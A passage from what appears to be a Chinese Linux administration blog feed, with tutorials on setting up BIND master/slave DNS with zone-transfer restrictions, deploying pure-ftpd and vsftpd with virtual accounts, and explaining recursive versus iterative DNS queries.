"/var/named/dynamic";&#125;; 3.打开/etc/named.rfc1912.zones文件，添加一个区域。%EF%BC%9A%E4%BD%BF%E7%94%A8bind%E5%AE%9E%E7%8E%B0%E4%B8%BB%E4%BB%8EDNS%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%95%B0%E6%8D%AE%E5%90%8C%E6%AD%A5/02.jpeg?raw=true) type: 用于定义区域类型，此时只有一个DNS服务器，所以为master，type可选值为：hint(根的)|master(主的)|slave(辅助的)|forward(转发) file：用于定义区域数据文件路径，默认该文件保存在/var/named/目录。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;区域添加好后，使用命令：named-checkconf 或 service named configtest测试配置文件语法格式。 %EF%BC%9A%E4%BD%BF%E7%94%A8bind%E5%AE%9E%E7%8E%B0%E4%B8%BB%E4%BB%8EDNS%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%95%B0%E6%8D%AE%E5%90%8C%E6%AD%A5/03.jpeg?raw=true) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;出错了！原来少了一个分号，配置文件的格式是每行后面都必须加分号结束，并且有花括号的地方，花括号两边必须要有空格。 %EF%BC%9A%E4%BD%BF%E7%94%A8bind%E5%AE%9E%E7%8E%B0%E4%B8%BB%E4%BB%8EDNS%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%95%B0%E6%8D%AE%E5%90%8C%E6%AD%A5/04.jpeg?raw=true) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;没有提示则表示文件语法正常。 4.新建数据库文件/var/named/wubinary.com.zone，并添加资源记录。 资源记录的格式： name [ttl] IN RRtype Value 资源记录名 有效时间 IN 类型 资源记录的值 SOA: 只能有一个，而且必须是第一个 name: 只能是区域名称，通常可以简写为@ value: 主DNS服务器的FQDN NS: 可以有多条 name: 区域名称，通常可以简写为@ value: DNS服务器的FQDN(可以使用相对名称) A: 只能定义在正向区域文件中 name: FQDN(可以使用相对名称) value: IP MX: 可以有多个 name: 区域名称，用于标识smtp服务器 value: 包含优先级和FQDN 优先级：0-99，数字越小，级别越高； CNAME: name: FQDN value: FQDN PTR: IP –&gt; FQDN, 只能定义在反向区域数据文件中，反向区域名称为逆向网络地址加.in-addr.arpa.后缀组成 name: IP, 逆向的主机地址，主机地址反过来写加上.in-addr.arpa. value: FQDN %EF%BC%9A%E4%BD%BF%E7%94%A8bind%E5%AE%9E%E7%8E%B0%E4%B8%BB%E4%BB%8EDNS%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%95%B0%E6%8D%AE%E5%90%8C%E6%AD%A5/05.jpeg?raw=true) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;$TTL为定义的宏，表示下面资源记录ttl的值都为600秒。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;@符号可代表区域文件/etc/named.conf里面定义的区域名称，即：”wubinary.com.”。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;每个区域的资源记录第一条必须是SOA，SOA后面接DNS服务器的域名和电子邮箱地址，此处电子邮箱地址里的@因为有特殊用途，所以此处要用点号代替。SOA后面小括号里的各值所代表的意义如下所示： @ IN SOA dns.wubinary.com dnsadmin.wubinary.com ( 2014031201 ;标识序列号，十进制数字，不能超过10位，通常使用日期 2H ;刷新时间，即每隔多久到主服务器检查一次，此处为2小时 4M ;重试时间，应该小于刷新时间，此处为4分钟 1D ;过期时间，此处为1天 2D ;主服务器挂后，从服务器至多工作的时间，此处为2天) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;区域数据文件配置好后，可以使用命令named-checkzone检查语法错误。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令格式： 1named-checkzone "zone_name" zone_file_name %EF%BC%9A%E4%BD%BF%E7%94%A8bind%E5%AE%9E%E7%8E%B0%E4%B8%BB%E4%BB%8EDNS%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%95%B0%E6%8D%AE%E5%90%8C%E6%AD%A5/06.jpeg?raw=true) 5.两个文件都配置好后，记得查看一下文件的所属组。因为bind程序的服务名称为named，bind默认是使用named组的身份操作文件，所以我们新建的文件所属组都要改为named，并且为了安全起见不能让别人有修改的权限，权限最好改为640。%EF%BC%9A%E4%BD%BF%E7%94%A8bind%E5%AE%9E%E7%8E%B0%E4%B8%BB%E4%BB%8EDNS%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%95%B0%E6%8D%AE%E5%90%8C%E6%AD%A5/07.jpeg?raw=true) 6.设置妥当当后我们就可以开启服务了。%EF%BC%9A%E4%BD%BF%E7%94%A8bind%E5%AE%9E%E7%8E%B0%E4%B8%BB%E4%BB%8EDNS%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%95%B0%E6%8D%AE%E5%90%8C%E6%AD%A5/08.jpeg?raw=true) 7.使用dig命令测试DNS。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令格式： 1dig [-t type] [-x addr] [name] [@server] -t: 指定资源类型，用于正解 -x: 指定IP地址，用于反解 %EF%BC%9A%E4%BD%BF%E7%94%A8bind%E5%AE%9E%E7%8E%B0%E4%B8%BB%E4%BB%8EDNS%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%95%B0%E6%8D%AE%E5%90%8C%E6%AD%A5/09.jpeg?raw=true) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;测试成功！ 8.以上配置的是DNS服务器的正向解析，接着再配置一下反向解析。编辑配置文件/etc/named.rfc1912.zones，添加一个反解区域。%EF%BC%9A%E4%BD%BF%E7%94%A8bind%E5%AE%9E%E7%8E%B0%E4%B8%BB%E4%BB%8EDNS%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%95%B0%E6%8D%AE%E5%90%8C%E6%AD%A5/10.jpeg?raw=true) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;因为反向解是和正向解析相反的，所以配置文件192.168.0.70.zone直接可以复制wubinary.com.zone修改。反向解析数据文件里面只有SOA、NS、PTR资源记录，所有A记录都要改为PTR记录，名称为IP地址，IP地址可以写全也可以简写，如果写全则是IP地址反写加上.in-addr.arpa.例如：70.0.168.192.in-addr.arpa. PTR资源记录的值为域名。 %EF%BC%9A%E4%BD%BF%E7%94%A8bind%E5%AE%9E%E7%8E%B0%E4%B8%BB%E4%BB%8EDNS%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%95%B0%E6%8D%AE%E5%90%8C%E6%AD%A5/11.jpeg?raw=true) 9.检查配置文件语法。%EF%BC%9A%E4%BD%BF%E7%94%A8bind%E5%AE%9E%E7%8E%B0%E4%B8%BB%E4%BB%8EDNS%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%95%B0%E6%8D%AE%E5%90%8C%E6%AD%A5/12.jpeg?raw=true) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;修改权限 %EF%BC%9A%E4%BD%BF%E7%94%A8bind%E5%AE%9E%E7%8E%B0%E4%B8%BB%E4%BB%8EDNS%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%95%B0%E6%8D%AE%E5%90%8C%E6%AD%A5/13.jpeg?raw=true) 10.重新载入配置文件，并测试反向解析。%EF%BC%9A%E4%BD%BF%E7%94%A8bind%E5%AE%9E%E7%8E%B0%E4%B8%BB%E4%BB%8EDNS%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%95%B0%E6%8D%AE%E5%90%8C%E6%AD%A5/14.jpeg?raw=true) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;使用dig -x 测试反向解析。 %EF%BC%9A%E4%BD%BF%E7%94%A8bind%E5%AE%9E%E7%8E%B0%E4%B8%BB%E4%BB%8EDNS%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%95%B0%E6%8D%AE%E5%90%8C%E6%AD%A5/15.jpeg?raw=true) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;反向解析配置成功！ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注意：通常在应用中，DNS的反向解析并不是很重要，可以不配置，当服务器中有域名作为邮件服务器时，此时可以配置反向解析，因为邮件中过滤垃圾邮件的技术通常是解析邮箱地址，如果IP地址不能反解成一个域名则视为垃圾邮件。 三、使用bind架设辅助DNS服务器，实现主从数据同步&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;DNS从服务器也叫辅服DNS服务器，如果网络上某个节点只有一台DNS服务器的话，首先服务器的抗压能力是有限的，当压力达到一定的程度，服务器就会宕机罢工，其次如果这台服务器出现了硬件故障那么服务器管理的区域的域名将无法访问。为了解决这些问题，最好的办法就是使用多个DNS服务器同时工作，并实现数据的同步，这样两台服务器就都可以实现域名解析操作。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;主DNS服务器架设好后，辅助的DNS服务器的架设就相对简单多了。架设主从DNS服务器有两个前提条件，一是两台主机可以不一定处在同一网段，但是两台主机之间必须要实现网络通信；二，辅助DNS服务器必须要有主DNS服务器的授权，才可以正常操作。此时，我们以IP地址192.168.0.80作为我们辅助的DNS服务器的IP地址； 1.设置IP地址；%EF%BC%9A%E4%BD%BF%E7%94%A8bind%E5%AE%9E%E7%8E%B0%E4%B8%BB%E4%BB%8EDNS%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%95%B0%E6%8D%AE%E5%90%8C%E6%AD%A5/16.jpeg?raw=true) 2.打开辅助DNS服务器的/etc/named.rfc1912.zones文件，添加两个区域记录，这两个记录是主DNS服务器配置文件里已经存在的记录，一个是正向解析记录，一个是反向解析记录。%EF%BC%9A%E4%BD%BF%E7%94%A8bind%E5%AE%9E%E7%8E%B0%E4%B8%BB%E4%BB%8EDNS%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%95%B0%E6%8D%AE%E5%90%8C%E6%AD%A5/17.jpeg?raw=true) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;type: slave，表示此时DNS服务器为辅助DNS服务器，于是下面一行就要定义主DNS服务器的IP地址，辅助DNS服务器才知道去哪里同步数据。辅助DNS服务器的资源类型数据文件通常保存在slaves目录，只需定义一个名称，文件内容通常是自动生成。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;配置好后，直接开启DNS服务，然后再回到主DNS服务器上。 3.修改主DNS服务器的数据文件，添加一条辅助DNS服务器记录，给辅助DNS服务器授权。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;修改正向解析文件/var/named/wubinary.com.zone。 %EF%BC%9A%E4%BD%BF%E7%94%A8bind%E5%AE%9E%E7%8E%B0%E4%B8%BB%E4%BB%8EDNS%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%95%B0%E6%8D%AE%E5%90%8C%E6%AD%A5/18.jpeg?raw=true) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;添加了一条NS记录，值为，ns2.wubinary.com.，对应的A记录也要增加一条，把IP地址指向对应的辅助DNS服务器的IP地址。修改完成后，记得要把序列号的值加1，用于通知辅助DNS服务器自动更新数据文件。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;修改反向解析文件/var/named/192.168.0.70.zone。 %EF%BC%9A%E4%BD%BF%E7%94%A8bind%E5%AE%9E%E7%8E%B0%E4%B8%BB%E4%BB%8EDNS%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%95%B0%E6%8D%AE%E5%90%8C%E6%AD%A5/19.jpeg?raw=true) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;同样的也增加了两条记录，一条辅助DNS服务器的NS记录和对应的PTR记录。修改完成后记得所序列号的值加1，用于通知辅助DNS服务器自动更新数据文件。 4.重新加载主DNS服务器的配置文件，这时再到回辅助DNS服务器，在/var/named/slaves/目录下会多了两个文件。%EF%BC%9A%E4%BD%BF%E7%94%A8bind%E5%AE%9E%E7%8E%B0%E4%B8%BB%E4%BB%8EDNS%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%95%B0%E6%8D%AE%E5%90%8C%E6%AD%A5/20.jpeg?raw=true ) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;查看文件内容，可以看到该文件和主DNS服务器上的文件内容是一样的。 %EF%BC%9A%E4%BD%BF%E7%94%A8bind%E5%AE%9E%E7%8E%B0%E4%B8%BB%E4%BB%8EDNS%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%95%B0%E6%8D%AE%E5%90%8C%E6%AD%A5/21.jpeg?raw=true) %EF%BC%9A%E4%BD%BF%E7%94%A8bind%E5%AE%9E%E7%8E%B0%E4%B8%BB%E4%BB%8EDNS%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%95%B0%E6%8D%AE%E5%90%8C%E6%AD%A5/22.jpeg?raw=true) 5.测试辅助DNS服务器。%EF%BC%9A%E4%BD%BF%E7%94%A8bind%E5%AE%9E%E7%8E%B0%E4%B8%BB%E4%BB%8EDNS%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%95%B0%E6%8D%AE%E5%90%8C%E6%AD%A5/23.jpeg?raw=true) %EF%BC%9A%E4%BD%BF%E7%94%A8bind%E5%AE%9E%E7%8E%B0%E4%B8%BB%E4%BB%8EDNS%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%95%B0%E6%8D%AE%E5%90%8C%E6%AD%A5/24.jpeg?raw=true) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在辅助DNS服务器上正向解析和反向解析都能测试成功！ 四、主从同步数据的安全性&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;DNS服务器的数据同步默认是没有限定主机的，也就是说，网络上只要有一台DNS服务器向你的DNS服务器请求数据，都能实现数据同步，那么这样就相当的不安全了。我们可以使用一个选项allow-transfer，指定可以同步数据的主机IP。主DNS服务器的数据可以给别的服务器同步，相对的，辅助DNS服务器的数据也是可以给其它辅助DNS服务器同步，于是，所有的主从DNS服务器都要设置该参数。 1.指定可以从主DNS服务器上同步数据的主机。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;修改/etc/named.rfc1912.zones文件： %EF%BC%9A%E4%BD%BF%E7%94%A8bind%E5%AE%9E%E7%8E%B0%E4%B8%BB%E4%BB%8EDNS%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%95%B0%E6%8D%AE%E5%90%8C%E6%AD%A5/25.jpeg?raw=true) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在每块区域上添加参数allow-transfer，花括号内填写可以同步的主机IP，一般填写辅助DNS服务器的IP地址。可以使用dig命令测试，区域同步： 1dig -t axfr ZONE_NAME @DNS_SERVCER_IP %EF%BC%9A%E4%BD%BF%E7%94%A8bind%E5%AE%9E%E7%8E%B0%E4%B8%BB%E4%BB%8EDNS%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%95%B0%E6%8D%AE%E5%90%8C%E6%AD%A5/26.jpeg?raw=true) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;指定IP可以同步数据。 %EF%BC%9A%E4%BD%BF%E7%94%A8bind%E5%AE%9E%E7%8E%B0%E4%B8%BB%E4%BB%8EDNS%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%95%B0%E6%8D%AE%E5%90%8C%E6%AD%A5/27.jpeg?raw=true) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;非指定IP不可以同步数据。 2.指定可以从辅助DNS服务器上同步数据的主机。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;修改/etc/named.rfc1912.zones文件： %EF%BC%9A%E4%BD%BF%E7%94%A8bind%E5%AE%9E%E7%8E%B0%E4%B8%BB%E4%BB%8EDNS%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%95%B0%E6%8D%AE%E5%90%8C%E6%AD%A5/28.jpeg?raw=true) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;我们只有一台辅助DNS服务器，所以根本不会有主机从这台机器同步数据，所以我们设置成不允许任何人同步。 五、测试DNS解析的其它命令&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; 测试DNS解析的命令不只是dig可以实现，还有两个命令也可以实现相同的效果。 1.host命令&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;host命令格式： 1# host [-t type] &#123;name&#125; [server] %EF%BC%9A%E4%BD%BF%E7%94%A8bind%E5%AE%9E%E7%8E%B0%E4%B8%BB%E4%BB%8EDNS%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%95%B0%E6%8D%AE%E5%90%8C%E6%AD%A5/29.jpeg?raw=true) 2.nslookup命令&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这个命令很神奇，在windows的dos里面也可以使用： 1234nslookup&gt;server DNS_SERVER_IPset q=TYPE&#123;name&#125; %EF%BC%9A%E4%BD%BF%E7%94%A8bind%E5%AE%9E%E7%8E%B0%E4%B8%BB%E4%BB%8EDNS%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%95%B0%E6%8D%AE%E5%90%8C%E6%AD%A5/30.jpeg?raw=true)]]></content>
      <tags>
        <tag>DNS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pureftp部署和优化]]></title>
    <url>%2F2017%2F08%2F10%2FFTP%2F1.%20pureftp%E9%83%A8%E7%BD%B2%E5%92%8C%E4%BC%98%E5%8C%96%2F</url>
    <content type="text"><![CDATA[pureftp部署和优化&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;FTP 是 File Transfer Protocol （文件传输协议）的英文简称，而中文简称为“文传协议”用于 Internet 上的控制文件的双向传输。同时，它也是一个应用程序（Applocation）用户可以通过它把自己的 PC 机与世界各地所有运行 FTP 协议的服务器相连，访问服务器上的大量程序和信息。 FTP 的主要作用，就是让用户连接上一个远程计算机（这些计算机上运行着 FTP 服务器程序）查看远程计算机有哪些文件，然后把文件从远程计算机上拷贝到本地计算机。或把本地计算机的文件送到远程计算机去。FTP 用得比 NFS 更多。 安装pure-ftpd&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在 centos 或者 redhat linux 上有自带的 ftp 软件叫做 vsftp ，但 pure-ftpd 比 vsftp 配置起来更加灵活。 1.下载软件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;pure-ftpd 官网 12[root@192 ~]# cd /usr/local/src[root@192 src]# wget http://download.pureftpd.org/pub/pure-ftpd/releases/pure-ftpd-1.0.42.tar.bz2 2.安装 pure-ftpd12[root@192 src]# tar jxvf pure-ftpd-1.0.42.tar.bz2 [root@192 src]# cd pure-ftpd-1.0.42 12345678./configure \--prefix=/usr/local/pureftpd \--without-inetd \--with-altlog \--with-puredb \--with-throttling \--with-peruserlimits \--with-tls &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;编译报错 123configure: error: in `/usr/local/src/pure-ftpd-1.0.42':configure: error: no acceptable C compiler found in $PATHSee `config.log' for more details &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;解决办法： 1yum install -y gcc &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;编译报错： 1configure: error: OpenSSL headers not found. &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;解决办法： 1yum install -y openssl-devel 1[root@192 pure-ftpd-1.0.42]# make &amp;&amp; make install 3.配置 pure-ftpd12345[root@192 pure-ftpd-1.0.42]# cd configuration-file/[root@192 configuration-file]# mkdir -p /usr/local/pureftpd/etc/[root@192 configuration-file]# cp pure-ftpd.conf /usr/local/pureftpd/etc/pure-ftpd.conf[root@192 configuration-file]# cp pure-config.pl /usr/local/pureftpd/sbin/pure-config.pl[root@192 configuration-file]# chmod 755 /usr/local/pureftpd/sbin/pure-config.pl &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在启动 pure-ftpd 之前需要先修改配置文件，配置文件为 /usr/local/pureftpd/etc/pure-ftpd.conf，把自带配置删除 12[root@192 configuration-file]# &gt; /usr/local/pureftpd/etc/pure-ftpd.conf [root@192 configuration-file]# vim /usr/local/pureftpd/etc/pure-ftpd.conf &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;加入内容： 12345678910111213141516171819202122232425262728ChrootEveryone yesBrokenClientsCompatibility noMaxClientsNumber 50Daemonize yesMaxClientsPerIP 8VerboseLog noDisplayDotFiles yesAnonymousOnly noNoAnonymous noSyslogFacility ftpDontResolve yesMaxIdleTime 15PureDB /usr/local/pureftpd/etc/pureftpd.pdbLimitRecursion 3136 8AnonymousCanCreateDirs noMaxLoad 4AntiWarez yesUmask 133:022MinUID 100AllowUserFXP noAllowAnonymousFXP noProhibitDotFilesWrite noProhibitDotFilesRead noAutoRename noAnonymousCantUpload noPIDFile /usr/local/pureftpd/var/run/pure-ftpd.pidMaxDiskUsage 99CustomerProof yes 4.启动 pure-ftpd12[root@192 configuration-file]# cd /usr/local/pureftpd/[root@192 pureftpd]# ./sbin/pure-config.pl ./etc/pure-ftpd.conf &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果启动成功，会显示一行长长的以 Running 开头的信息，否则那就是错误信息。重启会比较麻烦一些，重启可以使用下面的命令来实现： 12[root@192 pureftpd]# killall pure-ftpd[root@192 pureftpd]# cd /usr/local/pureftpd/;./sbin/pure-config.pl ./etc/pure-ftpd.conf 5.建立帐号&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;pure-ftpd 使用的帐号并非 linux 系统帐号，而是虚拟帐号。因为这样做比较安全。 123456[root@192 ~]# mkdir -p /data/www/[root@192 ~]# useradd www[root@192 ~]# chown -R www:www /data/www/[root@192 ~]# /usr/local/pureftpd/bin/pure-pw useradd ftp_user1 -uwww -d /data/www/Password: Enter it again: &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;其中，-u 将虚拟用户 ftp_user1 与系统用户 www 关联在一起，也就是说使用 ftp_user1 帐号登录 ftp 后，会以 www 的身份来读取文件或下载文件。 -d 后边的目录为 ftp_user1 账户的家目录，这样可以使 ftp_user1 只能访问其家目录 /data/www/ 。到这里还有最关键的一部，就是创建用户信息数据库文件： 1[root@192 ~]# /usr/local/pureftpd/bin/pure-pw mkdb &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;pure-pw 还可以列出当前的 ftp 帐号，当然也可以删除某个帐号。再创建一个帐号： 1234[root@192 ~]# /usr/local/pureftpd/bin/pure-pw useradd ftp_user2 -uwww -d /tmp/Password: Enter it again: [root@192 ~]# /usr/local/pureftpd/bin/pure-pw mkdb &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;列出当前帐号： 123[root@192 ~]# /usr/local/pureftpd/bin/pure-pw listftp_user1 /data/www/./ ftp_user2 /tmp/./ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;删除帐号的命令为： 1[root@192 ~]# /usr/local/pureftpd/bin/pure-pw userdel ftp_user2 6.测试 pure-ftpd&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;测试需要的工具叫做 lftp ，先安装 1[root@192 ~]# yum install -y lftp &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;测试： 12[root@192 ~]# touch /data/www/123.txt[root@192 ~]# lftp ftp_user1@127.0.0.1 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注：登录以后可以用 get 下载，put 上传。也可以用 ftp + ip 登录。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;登录后，使用 ls 命令可以列出当前目录都有什么软件。使用 lftp 工具是为了方便在 linux 系统里测试。最好的测试方法是，在 windows 机器里安装个 ftp 客户端软件（推荐 filezilla-client），然后去远程连接测试。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;下面使用 yum 安装 pure-ftpd 的方法。 123456[root@192 ~]# yum install -y epel-release expect[root@192 ~]# yum install -y pure-ftpd[root@192 ~]# curl http://www.apelearn.com/study_v2/.pf.c &gt; /etc/pure-ftpd/pure-ftpd.conf[root@192 ~]# user='mkpasswd -l 5 -s 0 -d 0 -C 0'[root@192 ~]# pass='mkpasswd -s 0'[root@192 ~]# echo $user $pass &gt; /tmp/ftp.pass &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;创建 ftp 服务的目录 12[root@192 ~]# mkdir -p /data/ftp[root@192 ~]# echo -e "$pass\n$pass"|pure-pw useradd $user -u apache -d /data/ftp/ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;创建密码文件 1[root@192 ~]# pure-pw mkdb &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;列出用户 1[root@192 ~]# pure-pw list &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;删除帐号 1[root@192 ~]# pure-pw userdel $user &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;启动服务 1[root@192 ~]# /etc/init.d/pure-ftpd start]]></content>
      <tags>
        <tag>FTP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[递归查询和迭代查询的区别]]></title>
    <url>%2F2017%2F08%2F10%2FDns%E3%80%81Iredmaill%2F6.%20%E9%80%92%E5%BD%92%E6%9F%A5%E8%AF%A2%E5%92%8C%E8%BF%AD%E4%BB%A3%E6%9F%A5%E8%AF%A2%E7%9A%84%E5%8C%BA%E5%88%AB%2F</url>
    <content type="text"><![CDATA[递归查询和迭代查询的区别递归查询&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;递归查询是一种DNS 服务器的查询模式，在该模式下DNS 服务器接收到客户机请求，必须使用一个准确的查询结果回复客户机。如果DNS 服务器本地没有存储查询DNS 信息，那么该服务器会询问其他服务器，并将返回的查询结果提交给客户机。 迭代查询&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;DNS 服务器另外一种查询方式为迭代查询，DNS 服务器会向客户机提供其他能够解析查询请求的DNS 服务器地址，当客户机发送查询请求时，DNS 服务器并不直接回复查询结果，而是告诉客户机另一台DNS 服务器地址，客户机再向这台DNS 服务器提交请求，依次循环直到返回查询的结果为止。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;两种过程的示意图：]]></content>
      <tags>
        <tag>DNS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[vsftp部署和优化]]></title>
    <url>%2F2017%2F08%2F10%2FFTP%2F2.%20vsftp%E9%83%A8%E7%BD%B2%E5%92%8C%E4%BC%98%E5%8C%96%2F</url>
    <content type="text"><![CDATA[vsftp部署和优化&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;作为系统默认自带的 ftp 服务软件，vsftp 也是比较常用的。 1.安装 vsftp1[root@192 ~]# yum install -y vsftpd db4-utils &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这里安装两个软件包，同时会把依赖的包安装上。其中 db4-utils 用来生成木马库文件。 2.建立帐号&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;vsftp 默认是可以支持使用系统帐号体系登录的，但这样不太安全，所以建议使用虚拟账号体系。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;建立虚拟账号相关的系统帐号 1[root@192 ~]# useradd virftp -s /sbin/nologin &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;建立虚拟账户相关的文件 1[root@192 ~]# vim /etc/vsftpd/vsftpd_login &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;内容如下： 1234test1123456test2abcdef &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;更改该文件的权限，提升安全级别 1[root@192 ~]# chmod 600 /etc/vsftpd/vsftpd_login &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;vsftpd 使用的密码文件肯定不是铭文的，需要生成对应的库文件： 1[root@192 ~]# db_load -T -t hash -f /etc/vsftpd/vsftpd_login /etc/vsftpd/vsftpd_login.db &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;建立虚拟帐号相关的目录以及配置文件 12[root@192 ~]# mkdir /etc/vsftpd/vsftpd_user_conf[root@192 ~]# cd /etc/vsftpd/vsftpd_user_conf &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;3.创建和用户对应的配置文件 1[root@192 vsftpd_user_conf]# vim test1 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;内容如下： 1234567891011local_root=/home/virftp/test1anonymous_enable=NOwrite_enable=YESlocal_umask=022anon_upload_enable=NOanon_mkdir_write_enable=NOidle_session_timeout=600data_connection_timeout=120max_clients=10max_per_ip=5local_max_rate=50000 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明:local_root 为该帐号的家目录，anonymous_enable 用来限制是否允许匿名帐号登录，若为 NO 表示不允许匿名帐号登录， write_enable=YES 表示可写，local_umask 指定 umask 值，anon_upload_enable 是否允许匿名帐号上传文件，anon_mkdir_write_enable 是否允许匿名帐号可写。以上为关键参数，其他暂时不用关心，创建 test2 帐号的步骤和 test1 一样。 123[root@192 vsftpd_user_conf]# mkdir /home/virftp/test1[root@192 vsftpd_user_conf]# chown -R virftp:virftp /home/virftp[root@192 vsftpd_user_conf]# vim /etc/pam.d/vsftpd &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在最开头添加两行： 12auth sufficient /lib64/security/pam_userdb.so db=/etc/vsftpd/vsftpd_loginaccount sufficient /lib64/security/pam_userdb.so db=/etc/vsftpd/vsftpd_login &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明：linux 为 64 位系统，所以库文件为 /lib64/security/pam_userdb.so ，若系统为 32位，那么库文件在 /lib/security/pam_userdb.so 4.修改全局配置文件 /etc/vsftpd.conf1[root@192 vsftpd_user_conf]# vim /etc/vsftpd/vsftpd.conf &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;改为 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;改为 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;改为 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;再增加： 12345chroot_local_user=YESguest_enabled=YESguest_username=virftpvirtual_use_local_privs=YESuser_config_dir=/etc/vsftpd/vsftpd_user_conf &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;最后启动 